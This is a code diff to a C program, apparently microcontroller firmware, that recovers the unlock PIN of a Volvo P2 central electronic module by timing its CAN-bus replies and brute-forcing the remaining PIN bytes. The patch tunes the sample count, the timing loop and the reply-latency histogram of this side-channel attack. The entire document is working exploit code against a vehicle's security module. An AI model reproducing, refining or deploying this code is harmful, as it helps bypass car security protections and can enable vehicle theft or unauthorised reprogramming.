@@ -80,7 +80,7 @@
 #define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
-#define SAMPLES        100   /* number of samples per sequence, more is better (up to 100) */
+#define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 
 /* end of tunable parameters */
@@ -542,8 +542,6 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   uint8_t *pMsgPin = unlockMsg + 2;
   uint32_t start, end, limit;
   uint32_t id;
-  uint32_t sampleCount;
-  uint32_t maxSample = 0;
   uint32_t maxTime = 0;
   bool     replyWait = true;
 
@@ -556,11 +554,9 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   pMsgPin[shuffleOrder[4]] = pin[4];
   pMsgPin[shuffleOrder[5]] = pin[5];
 
-  uint32_t clk_rate = clockCyclesPerMicrosecond();
-
   /* maximum time to collect our samples */
 
-  limit = millis () + 2;
+  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
 
   /* send the unlock request */
   canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
@@ -583,18 +579,12 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
    *  - a timeout occurs due to no bus activity
    */
 
-  for (sampleCount = 0, start = TSC;
-      (canInterruptReceived == false) &&
-      (millis () < limit);) {
+  start = TSC;
+  while (!canInterruptReceived && TSC < limit) {
     /* if the line is high, the CAN bus is either idle or transmitting a bit */
 
-    if (digitalRead (CAN_L_PIN)) {
-
-      /* count how many times we've seen the bus in a "1" state */
-
-      sampleCount++;
+    if (digitalRead (CAN_L_PIN))
       continue;
-    }
 
     /* the CAN bus isn't idle, it's the start of the next bit */
 
@@ -602,24 +592,16 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
     /* we only need to track the longest time we've seen */
 
-    if (sampleCount > maxSample) {
-      maxSample = sampleCount;
-      sampleCount = 0;
-
-      /* track the time in clock cycles */
-
+    if (end - start > maxTime)
       maxTime = end - start;
-    }
-
     /* start of the next sample */
 
-    start = TSC;
+    start = end;
   }
 
   /* default reply is set to indicate a failure */
 
-  memset (reply, 0, sizeof(reply));
-  reply[2] = 0xff;
+  memset (reply, 0xff, sizeof(reply));
 
   /* see if anything came back from the CEM */
 
@@ -780,7 +762,6 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   /* iterate over all possible values for the PIN digit */
 
   for (pin1 = 0; pin1 < 100; pin1++) {
-
     /* set PIN digit */
 
     pin[pos] = binToBcd (pin1);
@@ -861,12 +842,11 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
       int l = k - cem_reply_min;
       printf ("% 5u ", histogram[l]);
 
-if (k > cem_reply_avg + 2) {
       /* calculate weighted count and total of all entries */
       prod += histogram[l] * l;
       sum  += histogram[l];
     }
-    }
+
     /* weighted average */
 
     printf (": % 10u; best %02x is %s than %02x by %d\n", prod, binToBcd(best), ((int)best_prod - (int)prod) > 0 ? "greater" : "less", pin[pos], abs(best_prod - prod));
